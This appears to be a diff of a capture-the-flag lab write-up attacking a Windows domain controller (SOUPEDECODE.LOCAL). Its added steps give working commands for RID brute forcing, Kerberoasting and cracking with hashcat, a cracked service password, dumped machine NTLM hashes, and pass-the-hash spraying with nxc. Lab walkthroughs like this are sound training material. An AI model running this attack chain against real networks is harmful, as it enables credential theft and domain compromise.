@@ -54,44 +54,6 @@ SMB         10.10.180.100   445    DC01             SYSVOL                      
 SMB         10.10.180.100   445    DC01             Users
 ```
 
-looking at `IPC$`:
-```sh
-smbclient.py  'SOUPEDECODE.LOCAL\guest@DC01.SOUPEDECODE.LOCAL' -no-pass
-# use IPC$
-# ls
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 InitShutdown
--rw-rw-rw-          5  Mon Jan  1 02:05:09 1601 lsass
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 ntsvcs
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 scerpc
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-298-0
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-388-0
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 epmapper
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-23c-0
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 LSM_API_service
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-48-0
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 eventlog
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-2d4-0
--rw-rw-rw-          4  Mon Jan  1 02:05:09 1601 wkssvc
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 atsvc
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-298-1
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-518-0
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 TermSrv_API_service
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 Ctx_WinStation_API_service
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 SessEnvPublicRpc
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-7f0-0
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 RpcProxy\49675
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 e80b00e2f31daea5
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 RpcProxy\593
--rw-rw-rw-          4  Mon Jan  1 02:05:09 1601 srvsvc
--rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 netdfs
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-280-0
--rw-rw-rw-          4  Mon Jan  1 02:05:09 1601 W32TIME_ALT
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-ab0-0
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 dotnet-diagnostic-348
--rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-af4-0
-```
-
 Since you have read on `IPC$` you can do rid brute forceing:
 ```sh
 nxc smb SOUPEDECODE.LOCAL -u 'guest' --rid-brute
@@ -128,4 +90,50 @@ SMB         10.10.255.202   445    DC01             Users           READ
 Connect:
 ```sh
 smbclient '\\SOUPEDECODE.LOCAL\users' -U 'ybob317' -t 120
+# nothing is too interesting in shares
+```
+
+Try do some kerberosing:
+```sh
+nxc ldap "$DC" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"  -k  --kerberoasting kerb.txt
+hashcat -m 13100 kerb.txt -a 0 /opt/lists/rockyou.txt
+```
+
+We found we got creds-->>  `file_svc` :`Password123!!`
+
+found file in shares contain hashes:
+```
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+```
+
+doing user:password checks.
+```sh
+nxc smb "$DC" -u hash_user.txt -H "hashes.txt" -d "$DOMAIN"  --no-bruteforce --continue
+SMB         10.10.61.191    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.61.191    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.10.61.191    445    DC01             [-] soupedecode.local\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
+SMB         10.10.61.191    445    DC01             [-] soupedecode.local\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
+SMB         10.10.61.191    445    DC01             [+] soupedecode.local\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+SMB         10.10.61.191    445    DC01             [-] Connection Error: Error occurs while reading from remote(104)
+SMB         10.10.61.191    445    DC01             [-] soupedecode.local\BackupServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE
+SMB         10.10.61.191    445    DC01             [-] soupedecode.local\ApplicationServer$:8cd90ac6cba6dde9d8038b068c17e9f5 STATUS_LOGON_FAILURE
+SMB         10.10.61.191    445    DC01             [-] soupedecode.local\PrintServer$:b8a38c432ac59ed00b2a373f4f050d28 STATUS_LOGON_FAILURE
+SMB         10.10.61.191    445    DC01             [-] soupedecode.local\ProxyServer$:4e3f0bb3e5b6e3e662611b1a87988881 STATUS_LOGON_FAILURE
+SMB         10.10.61.191    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+```
+
+`FileServer$:e41da7e79a4c76dbd9cf79d1cb325559`
+
+getting root.txt
+```sh
+smbclient.py  "$DOMAIN"/"$USER"@"$DC" -k -no-pass -target-ip "$IP"
 ```
